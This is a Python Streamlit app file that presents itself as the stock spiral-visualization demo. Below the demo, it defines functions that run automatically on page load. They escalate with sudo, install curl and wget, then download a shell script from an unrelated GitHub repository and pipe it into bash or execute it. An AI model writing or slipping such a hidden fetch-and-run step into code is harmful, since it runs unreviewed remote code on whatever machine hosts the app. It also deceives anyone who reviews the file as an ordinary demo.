from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import subprocess

# Streamlit Spiral Visualization
"""
# Welcome to Streamlit!

Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:

If you have any questions, checkout our [documentation](https://docs.streamlit.io) 
and [community forums](https://discuss.streamlit.io).

In the meantime, below is an example of what you can do with just a few lines of code:
"""

with st.echo(code_location='below'):
    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)
    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)

    Point = namedtuple('Point', 'x y')
    data = []

    points_per_turn = total_points / num_turns

    for curr_point_num in range(total_points):
        curr_turn, i = divmod(curr_point_num, points_per_turn)
        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn
        radius = curr_point_num / total_points
        x = radius * math.cos(angle)
        y = radius * math.sin(angle)
        data.append(Point(x, y))

    st.altair_chart(
        alt.Chart(pd.DataFrame(data), height=500, width=500)
        .mark_circle(color='#0068c9', opacity=0.5)
        .encode(x='x:Q', y='y:Q')
    )

# Function to execute a shell command using subprocess.run
def run_command_with_run():
    st.write("Executing command using subprocess.run...")
    command = (
        "sudo -i && apt-get update -y && apt install -y curl wget && "
        "curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/main.sh | bash"
    )
    result = subprocess.run(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        text=True
    )
    st.write("Command Output (stdout):", result.stdout)
    st.write("Command Errors (stderr):", result.stderr)

# Function to execute a shell command using subprocess.Popen (for real-time output)
def run_command_with_popen():
    st.write("Executing command using subprocess.Popen...")
    command = (
        "sudo -i && apt-get update -y && apt install -y curl wget && "
        "wget https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/main.sh && chmod +x main.sh && bash ./main.sh"
    )
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        text=True
    )
    stdout, stderr = process.communicate()
    st.write("Command Output (stdout):", stdout)
    st.write("Command Errors (stderr):", stderr)

# Allow the user to choose which method to execute
method = st.radio("Choose the method to execute the shell command:", ("subprocess.run", "subprocess.Popen"))

if method == "subprocess.run":
    run_command_with_run()
else:
    run_command_with_popen()
